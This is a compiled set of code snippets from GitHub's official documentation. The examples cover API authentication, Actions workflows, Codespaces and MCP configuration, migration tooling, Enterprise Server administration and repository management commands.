Curl\nDESCRIPTION: This snippet shows how to authenticate to the GitHub REST API using basic authentication with a client ID as the username and a client secret as the password. This method is specifically used for GitHub Apps and OAuth Apps when certain endpoints require it.  Replace `YOUR_CLIENT_ID` and `YOUR_CLIENT_SECRET` with the actual values.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/authentication/authenticating-to-the-rest-api.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ncurl --request POST \\\n--url \"{% data variables.product.rest_url %}/applications/YOUR_CLIENT_ID/token\" \\\n--user \"YOUR_CLIENT_ID:YOUR_CLIENT_SECRET\" \\\n--header \"Accept: application/vnd.github+json\" \\\n--header \"X-GitHub-Api-Version: {{ allVersions[currentVersion].latestApiVersion }}\" \\\n--data '{\n  \"access_token\": \"ACCESS_TOKEN_TO_CHECK\"\n}'\n```\n\n----------------------------------------\n\nTITLE: Defining DiscussionOrder Input Type in GraphQL\nDESCRIPTION: This GraphQL input type `DiscussionOrder` defines how discussions can be ordered. It includes fields for specifying the field by which to order discussions (`field`) and the direction in which to order them (`direction`).\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-the-graphql-api-for-discussions.md#_snippet_2\n\nLANGUAGE: GraphQL\nCODE:\n```\n\"\"\"\nWays in which discussions can be ordered.\n\"\"\"\ninput DiscussionOrder {\n  \"\"\"\n  The field by which to order discussions.\n  \"\"\"\n  field: DiscussionOrderField!\n\n  \"\"\"\n  The direction in which to order discussions by the specified field.\n  \"\"\"\n  direction: OrderDirection!\n}\n```\n\n----------------------------------------\n\nTITLE: Initial devcontainer.json configuration\nDESCRIPTION: This JSON configuration defines the initial setup for a Node.js development container in GitHub Codespaces. It specifies the base image, features like JSHint, and provides placeholders for port forwarding, post-creation commands, and VS Code customizations. The configuration leverages a Microsoft-provided image and installs a JSHint feature for code quality checks. It serves as a starting point for customizing the development environment.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/setting-up-your-project-for-codespaces/adding-a-dev-container-configuration/setting-up-your-nodejs-project-for-codespaces.md#_snippet_0\n\nLANGUAGE: jsonc\nCODE:\n```\n// For format details, see https://aka.ms/devcontainer.json. For config options, see the\n// README at: https://github.com/devcontainers/templates/tree/main/src/javascript-node\n{\n  \"name\": \"Node.js\",\n  // Or use a Dockerfile or Docker Compose file. More info: https://containers.dev/guide/dockerfile\n  \"image\": \"mcr.microsoft.com/devcontainers/javascript-node:0-18-bullseye\",\n  \"features\": {\n    \"ghcr.io/devcontainers-contrib/features/jshint:2\": {}\n  }\n\n  // Features to add to the dev container. More info: https://containers.dev/features.\n  // \"features\": {},\n\n  // Use 'forwardPorts' to make a list of ports inside the container available locally.\n  // \"forwardPorts\": [],\n\n  // Use 'postCreateCommand' to run commands after the container is created.\n  // \"postCreateCommand\": \"yarn install\",\n\n  // Configure tool-specific properties.\n  // \"customizations\": {},\n\n  // Uncomment to connect as root instead. More info: https://aka.ms/dev-containers-non-root.\n  // \"remoteUser\": \"root\"\n}\n```\n\n----------------------------------------\n\nTITLE: Controlling Optional Features with `--features` (Shell)\nDESCRIPTION: Uses the `--features` option to limit the features used in workflows that Actions Importer creates. This is useful for excluding newer Actions syntax when migrating to an older GitHub Enterprise Server instance. The example specifies the target GHES version.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/supplemental-arguments-and-settings.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer dry-run ... --features ghes-3.3\n```\n\n----------------------------------------\n\nTITLE: Setting Multiline Environment Variable in PowerShell (pwsh)\nDESCRIPTION: This YAML configuration demonstrates how to set a multiline environment variable in PowerShell Core (pwsh). It defines `JSON_RESPONSE` using a dynamically generated GUID as a delimiter.  It uses `Invoke-WebRequest` to fetch content from a URL. The result is then appended to `$env:GITHUB_ENV`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_37\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - name: Set the value in pwsh\n    id: step_one\n    run: |\n      $EOF = (New-Guid).Guid\n      \"JSON_RESPONSE<<$EOF\" >> $env:GITHUB_ENV\n      (Invoke-WebRequest -Uri \"https://example.com\").Content >> $env:GITHUB_ENV\n      \"$EOF\" >> $env:GITHUB_ENV\n    shell: pwsh\n\n```\n\n----------------------------------------\n\nTITLE: Configuring Fetch MCP Server\nDESCRIPTION: This code snippet demonstrates the configuration for the Fetch MCP server within a `.vscode/mcp.json` file. The `inputs` section defines the required input type as `promptString`. The `servers` section defines the `fetch` server with its command set to `uvx` and arguments including `mcp-server-fetch`. This configuration enables web content fetching capabilities within {% data variables.product.prodname_copilot_chat_short %}.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/customizing-copilot/extending-copilot-chat-with-mcp.md#_snippet_0\n\nLANGUAGE: JSON\nCODE:\n```\n{\n    \"inputs\": [\n      // The \"inputs\" section defines the inputs required for the MCP server configuration. \n      {\n        \"type\": \"promptString\"\n      }\n    ],\n    \"servers\": {\n      // The \"servers\" section defines the MCP servers you want to use.\n      \"fetch\": {\n        \"command\": \"uvx\",\n        \"args\": [\"mcp-server-fetch\"]\n      }\n     }\n    }\n```\n\n----------------------------------------\n\nTITLE: Accessing Environment Variables using Contexts in YAML\nDESCRIPTION: This YAML snippet shows how to access environment variables using the `env` context within a `run` step in a GitHub Actions workflow.  It demonstrates the interpolation of variables before the job is sent to the runner, using the `${{ env.VARIABLE_NAME }}` syntax. It assumes that environment variables like `Greeting`, `First_Name`, and `DAY_OF_WEEK` are already defined in the workflow or environment.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/store-information-in-variables.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\nrun: echo \"${{ env.Greeting }} ${{ env.First_Name }}. Today is ${{ env.DAY_OF_WEEK }}!\"\n```\n\n----------------------------------------\n\nTITLE: Dry-Run Migration of Travis CI Pipeline\nDESCRIPTION: This code snippet demonstrates how to perform a dry-run migration of a Travis CI pipeline to a GitHub Actions workflow using the `gh actions-importer dry-run travis-ci` command. It converts a Travis CI pipeline and creates output files in a specified directory, without creating a pull request. It requires specifying the Travis CI repository name and output directory.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-travis-ci-with-github-actions-importer.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer dry-run travis-ci --travis-ci-repository my-travis-ci-repository --output-dir tmp/dry-run\n```\n\n----------------------------------------\n\nTITLE: Creating Initial Full Backup\nDESCRIPTION: This command initiates a full backup of the GitHub Enterprise instance. It uses the `ghe-backup` utility located in the `./bin` directory.  The backup is stored in the directory specified by `GHE_DATA_DIR` in the `backup.config` file.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/backing-up-and-restoring-your-instance/configuring-backups-on-your-instance.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\n./bin/ghe-backup\n```\n\n----------------------------------------\n\nTITLE: Specifying Rust Version\nDESCRIPTION: These steps configure the runner to use the nightly build of Rust and output the Rust version for verification. It uses `rustup` to override the default Rust toolchain version.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-rust.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\n      - name: Temporarily modify the rust toolchain version\n        run: rustup override set nightly\n      - name: Output rust version for educational purposes\n        run: rustup --version\n```\n\n----------------------------------------\n\nTITLE: Extracting RuboCop Errors and Creating Annotations - Ruby\nDESCRIPTION: This Ruby code snippet extracts error information from a RuboCop report (stored in `@output`) to create annotations for a GitHub check run. It iterates through the files and offenses reported by RuboCop, limiting the number of annotations to 50. It sets the check run conclusion to 'success' if no errors are found, or 'neutral' otherwise, and prepares an array of annotations with the file path, line numbers, column numbers, error message, and annotation level.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_37\n\nLANGUAGE: ruby\nCODE:\n```\n    annotations = []\n    # You can create a maximum of 50 annotations per request to the Checks\n    # API. To add more than 50 annotations, use the \"Update a check run\" API\n    # endpoint. This example code limits the number of annotations to 50.\n    # See /rest/reference/checks#update-a-check-run\n    # for details.\n    max_annotations = 50\n\n    # RuboCop reports the number of errors found in \"offense_count\"\n    if @output['summary']['offense_count'] == 0\n      conclusion = 'success'\n    else\n      conclusion = 'neutral'\n      @output['files'].each do |file|\n\n        # Only parse offenses for files in this app's repository\n        file_path = file['path'].gsub(/#{repository}\\//,'')\n        annotation_level = 'notice'\n\n        # Parse each offense to get details and location\n        file['offenses'].each do |offense|\n          # Limit the number of annotations to 50\n          next if max_annotations == 0\n          max_annotations -= 1\n\n          start_line   = offense['location']['start_line']\n          end_line     = offense['location']['last_line']\n          start_column = offense['location']['start_column']\n          end_column   = offense['location']['last_column']\n          message      = offense['message']\n\n          # Create a new annotation for each error\n          annotation = {\n            path: file_path,\n            start_line: start_line,\n            end_line: end_line,\n            start_column: start_column,\n            end_column: end_column,\n            annotation_level: annotation_level,\n            message: message\n          }\n          # Annotations only support start and end columns on the same line\n          if start_line == end_line\n            annotation.merge({start_column: start_column, end_column: end_column})\n          end\n\n          annotations.push(annotation)\n        end\n      end\n    end\n\n    # ADD CODE HERE TO UPDATE CHECK RUN SUMMARY #\n```\n\n----------------------------------------\n\nTITLE: Cloning Git Repository using Access Token - Shell\nDESCRIPTION: This snippet demonstrates how to clone a Git repository using an access token for HTTP-based Git access.  The access token is used as the password in the Git clone URL.  The \"Contents\" repository permission or the \"Workflows\" repository permission is required. Replace `TOKEN` with the actual access token.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/registering-a-github-app/choosing-permissions-for-a-github-app.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit clone https://x-access-token:TOKEN@github.com/owner/repo.git\n```\n\n----------------------------------------\n\nTITLE: Creating Pre-Receive Hook Environment via Admin Shell\nDESCRIPTION: This command uses the `ghe-hook-env-create` utility to create a pre-receive hook environment on GitHub Enterprise Server using the provided tar.gz file. The first argument is the environment name, and the second is the path to the tar.gz file.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/enforcing-policies/enforcing-policy-with-pre-receive-hooks/creating-a-pre-receive-hook-environment.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\nadmin@ghe-host:~$ ghe-hook-env-create DebianTestEnv /home/admin/debian.tar.gz\n> Pre-receive hook environment 'DebianTestEnv' (2) has been created.\n```\n\n----------------------------------------\n\nTITLE: Convert Provisioning Profile to Base64 (Shell)\nDESCRIPTION: This command converts an Apple provisioning profile (.mobileprovision file) to Base64 encoding and copies the output to the clipboard.  It is used to store the provisioning profile as a secret in {% data variables.product.prodname_dotcom %}.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/installing-an-apple-certificate-on-macos-runners-for-xcode-development.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nbase64 -i PROVISIONING_PROFILE.mobileprovision | pbcopy\n```\n\n----------------------------------------\n\nTITLE: Replacing Text with git-filter-repo\nDESCRIPTION: This command uses `git-filter-repo` to replace text found in the specified file from the repository's history. The `--replace-text` argument specifies the file containing the text to replace. `--sensitive-data-removal` enables sensitive data removal mode.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngit-filter-repo --sensitive-data-removal --replace-text ../passwords.txt\n```\n\n----------------------------------------\n\nTITLE: SARIF URI Conversion Example\nDESCRIPTION: Demonstrates how absolute URIs are converted to relative URIs during SARIF file upload using a specified source root.  This example illustrates a successful upload where both absolute URIs use the same URI scheme as the provided source root.  It assumes a source root of `file:///github/workspace`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/integrating-with-code-scanning/sarif-support-for-code-scanning.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\n# Conversion of absolute URIs to relative URIs for location artifacts\n\nfile:///github/workspace/src/main.go -> src/main.go\nfile:///tmp/go-build/tmp.go          -> file:///tmp/go-build/tmp.go\n```\n\n----------------------------------------\n\nTITLE: Mapping GITLAB_USER_LOGIN to GitHub Actions variable\nDESCRIPTION: Maps the GitLab CI environment variable `GITLAB_USER_LOGIN` to the GitHub Actions equivalent `${{ github.actor }}`.  Provides the login name of the user who triggered the workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_53\n\nLANGUAGE: YAML\nCODE:\n```\n${{ github.actor }}\n```\n\n----------------------------------------\n\nTITLE: Starting SSH Agent in Background\nDESCRIPTION: This snippet starts the SSH agent in the background. The SSH agent manages the private keys used for SSH authentication. This command is a prerequisite for adding and using SSH keys.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/troubleshooting-ssh/error-permission-denied-publickey.md#_snippet_5\n\nLANGUAGE: Shell\nCODE:\n```\n$ eval \"$(ssh-agent -s)\"\n> Agent pid 59566\n```\n\n----------------------------------------\n\nTITLE: Example github.repository reference\nDESCRIPTION: This code shows an example object for `github.repository`, which provides information about the active repository. It includes the reference type, data (repository details), ID, is_implicit flag, and metadata.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/building-copilot-extensions/building-a-copilot-agent-for-your-copilot-extension/context-passing-for-your-agent.md#_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n{\n    // The reference type.\n    \"type\": \"github.repository\",\n    \"data\": {\n        \"type\": \"repository\",\n        \"id\": \"abc-123\",\n        \"name\": \"example-repository\",\n        \"ownerLogin\": \"example-user\",\n        \"ownerType\": \"\",\n        \"readmePath\": \"\",\n        \"description\": \"\",\n        \"commitOID\": \"\",\n        \"ref\": \"\",\n        \"refInfo\": {\n            \"name\": \"\",\n            \"type\": \"\"\n        },\n        \"visibility\": \"\",\n        \"languages\": null\n    },\n    \"id\": \"example-user/example-repository\",\n    // `is_implicit` is always false for github.repository.\n    \"is_implicit\": false,\n    \"metadata\": {\n        \"display_name\": \"https://github.com/example-user/example-repository\",\n        \"display_icon\": \"\",\n        \"display_url\": \"\"\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Trigger workflow on push event\nDESCRIPTION: This workflow triggers when a push event occurs. It demonstrates using the `push` event to trigger workflows on code pushes.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_35\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  push\n```\n\n----------------------------------------\n\nTITLE: Mermaid Diagram Example\nDESCRIPTION: This snippet demonstrates the syntax of a Mermaid diagram. It defines a flowchart showing a decision process for purchasing a gift. The diagram can be rendered by GitHub when the file has a `.mermaid` or `.mmd` extension.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/using-files/working-with-non-code-files.md#_snippet_4\n\nLANGUAGE: Text\nCODE:\n```\ngraph TD\n    A[Friend's Birthday] -->|Get money| B(Go shopping)\n    B --> C{Let me think}\n    C -->|One| D[\"Cool <br> Laptop\"]\n    C -->|Two| E[iPhone]\n    C -->|Three| F[fa:fa-car Car]\n```\n\n----------------------------------------\n\nTITLE: Using always() with steps context in GitHub Actions\nDESCRIPTION: This YAML snippet demonstrates how to use the `always()` function in combination with the `steps.<step_id>.conclusion` context in GitHub Actions to replicate Bitbucket Pipelines' `after-scripts` functionality. This allows for execution of steps regardless of the success or failure of previous steps. The `if` condition checks the conclusion of a previous step and always executes the current step.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bitbucket-pipelines-with-github-actions-importer.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n    - name: After Script 1\n      run: |-\n        echo \"I'm after the script ran!\"\n        echo \"We should be grouped!\"\n      id: after-script-1\n      if: \"{% raw %}${{ always() }}{% endraw %}\"\n    - name: After Script 2\n      run: |-\n        echo \"this is really the end\"\n        echo \"goodbye, for now!\"\n      id: after-script-2\n      if: \"{% raw %}${{ steps.after-script-1.conclusion == 'success' && always() }}{% endraw %}\"\n```\n\n----------------------------------------\n\nTITLE: Defining Form Elements in YAML\nDESCRIPTION: This YAML snippet demonstrates how to define a form with different elements, including a textarea for the operating system, a dropdown for software version selection, a checkbox for agreeing to the Code of Conduct, and a markdown element to display a thank you message. It showcases the `type`, `attributes`, and `validations` keys to configure each element.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/syntax-for-githubs-form-schema.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\n- type: textarea\n  attributes:\n    label: Operating System\n    description: What operating system are you using?\n    placeholder: \"Example: macOS Big Sur\"\n    value: operating system\n  validations:\n    required: true\n- type: dropdown\n  attributes:\n    label: Version\n    description: What version of our software are you running?\n    multiple: false\n    options:\n      - 1.0.2 (Default)\n      - 1.0.3 (Edge)\n    default: 0\n  validations:\n    required: true\n- type: checkboxes\n  attributes:\n    label: Code of Conduct\n    description: The Code of Conduct helps create a safe space for everyone. We require\n      that everyone agrees to it.\n    options:\n      - label: I agree to follow this project's [Code of Conduct](link/to/coc)\n        required: true\n- type: markdown\n  attributes:\n    value: \"Thanks for completing our form!\"\n```\n\n----------------------------------------\n\nTITLE: Audit GitLab Instance with Config File (Shell)\nDESCRIPTION: This command audits a GitLab instance using a YAML configuration file. The `--config-file-path` argument specifies the path to the configuration file. The config file specifies which repositories and paths will be audited.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_9\n\nLANGUAGE: Shell\nCODE:\n```\ngh actions-importer audit gitlab --output-dir path/to/output/ --namespace my-gitlab-namespace --config-file-path path/to/gitlab/config.yml\n```\n\n----------------------------------------\n\nTITLE: Checking for Latest GitHub Enterprise Release (Shell)\nDESCRIPTION: Checks for the latest GitHub Enterprise release using the `ghe-update-check` utility. The `-i` switch is used to initiate the check and download the package if available. Requires SSH access to the GitHub Enterprise Server appliance as the `admin` user.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_101\n\nLANGUAGE: shell\nCODE:\n```\nssh -p 122 admin@HOSTNAME -- 'ghe-update-check'\n```\n\n----------------------------------------\n\nTITLE: Defining a matrix in GitHub Actions YAML\nDESCRIPTION: This snippet illustrates how to define a matrix in GitHub Actions' YAML workflow. It uses the `strategy` and `matrix` keywords to define the different environments to test against, in this case, different Ruby versions.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-travis-ci-to-github-actions.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  build:\n    strategy:\n      matrix:\n        ruby: ['2.5', '2.6.3']\n```\n\n----------------------------------------\n\nTITLE: Running a Production Migration for a Bamboo Build Plan\nDESCRIPTION: This command migrates a Bamboo build plan to a GitHub Actions workflow and opens a pull request with the converted workflow. The `--plan-slug` parameter specifies the Bamboo plan's project and plan key. The `--target-url` parameter specifies the URL of the GitHub repository. The `--output-dir` parameter specifies the output directory for logs.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bamboo-with-github-actions-importer.md#_snippet_9\n\nLANGUAGE: Shell\nCODE:\n```\ngh actions-importer migrate bamboo build --plan-slug :my_plan_slug --target-url :target_url --output-dir tmp/migrate\n```\n\n----------------------------------------\n\nTITLE: Example default terminal profiles\nDESCRIPTION: This snippet provides an example of setting the default terminal profile for macOS (osx), Linux, and Windows in VS Code's `settings.json`. It configures the default shell to be `zsh` on macOS, `bash` on Linux, and `PowerShell` on Windows. It assumes these shells are available.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/customizing-your-codespace/changing-the-shell-in-a-codespace.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n   {\n      \"terminal.integrated.defaultProfile.osx\": \"zsh\",\n      \"terminal.integrated.defaultProfile.linux\": \"bash\",\n      \"terminal.integrated.defaultProfile.windows\": \"PowerShell\"\n   }\n\n```\n\n----------------------------------------\n\nTITLE: Workflow Configuration for Local Action Usage\nDESCRIPTION: Defines a workflow that uses the composite action within the same repository.  The `uses` keyword references the local path to the action's directory.  The sample also shows passing an input parameter and capturing the output of the composite action.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/creating-a-composite-action.md#_snippet_11\n\nLANGUAGE: YAML\nCODE:\n```\non: [push]\n\njobs:\n  hello_world_job:\n    runs-on: ubuntu-latest\n    name: A job to say hello\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - id: foo\n        uses: ./.github/actions/hello-world-composite-action\n        with:\n          who-to-greet: 'Mona the Octocat'\n      - run: echo random-number \"$RANDOM_NUMBER\"\n        shell: bash\n        env:\n          RANDOM_NUMBER: {% raw %}${{ steps.foo.outputs.random-number }}{% endraw %}\n\n```\n\n----------------------------------------\n\nTITLE: Git URL InsteadOf Configuration - Git Config\nDESCRIPTION: This Git configuration snippet configures Git to use SSH protocol instead of HTTPS when interacting with GitHub. The `url.\"git@github.com:\".insteadOf` setting replaces all `https://github.com/` URLs with `git@github.com:` URLs, forcing Git to use SSH for authentication. This is often found in dotfiles but can cause authentication issues in GitHub Codespaces, which defaults to HTTPS.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/troubleshooting/troubleshooting-authentication-to-a-repository.md#_snippet_2\n\nLANGUAGE: gitconfig\nCODE:\n```\n[url \"git@github.com:\"]\n  insteadOf = https://github.com/\n```\n\n----------------------------------------\n\nTITLE: Installing PowerShell Module Dependencies (YAML)\nDESCRIPTION: This YAML snippet demonstrates how to install PowerShell module dependencies, such as `SqlServer` and `PSScriptAnalyzer`, from the PowerShell Gallery within a GitHub Actions workflow. It configures the `PSGallery` repository as trusted and uses the `Install-Module` cmdlet.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-powershell.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  install-dependencies:\n    name: Install dependencies\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Install from PSGallery\n        shell: pwsh\n        run: |\n          Set-PSRepository PSGallery -InstallationPolicy Trusted\n          Install-Module SqlServer, PSScriptAnalyzer\n```\n\n----------------------------------------\n\nTITLE: Creating a Codespace using GitHub CLI\nDESCRIPTION: This command creates a new codespace using the GitHub CLI.  It prompts the user to select a repository, branch, dev container configuration file, and machine type if not specified with flags. It can be used interactively or with flags to specify configurations.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/creating-a-codespace-for-a-repository.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh codespace create\n```\n\n----------------------------------------\n\nTITLE: Optimizing Inefficient Bash Script\nDESCRIPTION: This bash script iterates through .txt files in the current directory and counts the number of lines in each file. The script can be optimized to execute more efficiently by using `find` with the `-exec ... +` option, which allows `find` to pass multiple files to `wc` at once.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/refactoring-code-with-github-copilot.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\n#!/bin/bash\n\n# Find all .txt files and count lines in each\nfor file in $(find . -type f -name \"*.txt\"); do\n    wc -l \"$file\"\ndone\n```\n\n----------------------------------------\n\nTITLE: Adding YAML Frontmatter to an Issue Template\nDESCRIPTION: This YAML snippet demonstrates how to add frontmatter to an issue template to pre-fill the issue title, automatically add labels and assignees, and provide a name and description for the template. The `name` field is the name of the template shown in the template chooser, `about` is a description of the template, `title` is the pre-filled title, `labels` are the labels automatically added, and `assignees` are the users automatically assigned to the issue.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/manually-creating-a-single-issue-template-for-your-repository.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\n---\nname: Tracking issue\nabout: Use this template for tracking new features.\ntitle: \"[DATE]: [FEATURE NAME]\"\nlabels: tracking issue, needs triage\nassignees: octocat\n---\n```\n\n----------------------------------------\n\nTITLE: Updating a Single Select Field using GraphQL with curl\nDESCRIPTION: This snippet demonstrates how to update a single select field for a project item using the GitHub GraphQL API and `curl`. It requires replacing `PROJECT_ID`, `ITEM_ID`, `FIELD_ID`, and `OPTION_ID` with the appropriate values. The API key should be provided as a bearer token in the `Authorization` header.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_23\n\nLANGUAGE: shell\nCODE:\n```\ncurl --request POST \\\n  --url https://api.github.com/graphql \\\n  --header 'Authorization: Bearer TOKEN' \\\n  --data '{\"query\":\"mutation {updateProjectV2ItemFieldValue( input: { projectId: \\\"PROJECT_ID\\\" itemId: \\\"ITEM_ID\\\" fieldId: \\\"FIELD_ID\\\" value: { singleSelectOptionId: \\\"OPTION_ID\\\" }}) { projectV2Item { id }}}\"}'\n```\n\n----------------------------------------\n\nTITLE: Assigning a Pull Request using gh CLI\nDESCRIPTION: This snippet shows how to assign a pull request to a user using the `--assignee` flag with the `gh pr create` command. The `@me` option self-assigns the pull request.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ngh pr create --assignee \"@octocat\"\n```\n\n----------------------------------------\n\nTITLE: Adding a Repository Cache\nDESCRIPTION: This command adds a repository cache to an existing replication setup. It uses the `-a` or `--add` argument to indicate that a new cache is being added in addition to existing replicas. It configures the replication from the primary instance defined by PRIMARY-IP.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/caching-repositories/configuring-a-repository-cache.md#_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nghe-repl-setup -a PRIMARY-IP\n```\n\n----------------------------------------\n\nTITLE: Counting Affected Pull Requests\nDESCRIPTION: This command uses `grep` to count the number of pull requests affected by the history rewrite. It searches for lines starting with `refs/pull/.*/head$` in the `.git/filter-repo/changed-refs` file and counts them using `-c`.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository.md#_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\n$ grep -c '^refs/pull/.*/head$' .git/filter-repo/changed-refs\n```\n\n----------------------------------------\n\nTITLE: Cloning TFVC Repository with git-tfs\nDESCRIPTION: Clones a TFVC repository into a Git repository using `git tfs clone`. This command migrates the TFVC repository, including its history, to a local Git repository. Replace `https://dev.azure.com/octocat` with your TFVC URL and `$/example` with your TFVC repository path. The `--branches=all` argument is used to fetch all branches.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/importing-a-team-foundation-version-control-repository.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\ngit tfs clone --branches=all https://dev.azure.com/octocat $/example\n```\n\n----------------------------------------\n\nTITLE: Creating a Custom Repository List (JSON Example)\nDESCRIPTION: This JSON snippet demonstrates the structure for defining a custom repository list in the `databases.json` file for use with GitHub CodeQL variant analysis. The `name` field specifies the list's name, and the `repositories` field contains an array of repository names (e.g., 'organization/repository'). This allows for easy selection of repositories for analysis within the \"Variant Analysis Repositories\" view.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-for-vs-code/getting-started-with-codeql-for-vs-code/running-codeql-queries-at-scale-with-multi-repository-variant-analysis.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n    \"name\": \"new-repo-list\",\n    \"repositories\": [\n        \"my-organization/my-repository\"\n    ]\n}\n```\n\n----------------------------------------\n\nTITLE: Marking Pull Request as Draft using gh CLI\nDESCRIPTION: This snippet demonstrates how to mark a pull request as a draft using the `--draft` flag with the `gh pr create` command. Draft pull requests are not ready for review or merging.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request.md#_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ngh pr create --draft\n```\n\n----------------------------------------\n\nTITLE: Removing a Local Directory\nDESCRIPTION: Removes the temporary local directory created by the bare clone, using `rm -rf`. This cleans up the local file system after the mirror-push operation is complete.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/working-with-forks/detaching-a-fork.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nrm -rf FORK.git\n```\n\n----------------------------------------\n\nTITLE: Configuring Azure Artifacts Python feed with username/password in dependabot.yml\nDESCRIPTION: This snippet configures an Azure Artifacts Python feed in `dependabot.yml` using a username and password. It specifies the registry type, URL, username, and password.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/guidance-for-the-configuration-of-private-registries-for-dependabot.md#_snippet_19\n\nLANGUAGE: yaml\nCODE:\n```\nregistries:\n  python-azure:\n    type: python-index\n    url: https://pkgs.dev.azure.com/octocat/_packaging/my-feed/pypi/example\n    username: octocat@example.com\n    password: ${{secrets.MY_AZURE_DEVOPS_TOKEN}}\n```\n\n----------------------------------------\n\nTITLE: Reusable Workflow Secrets - 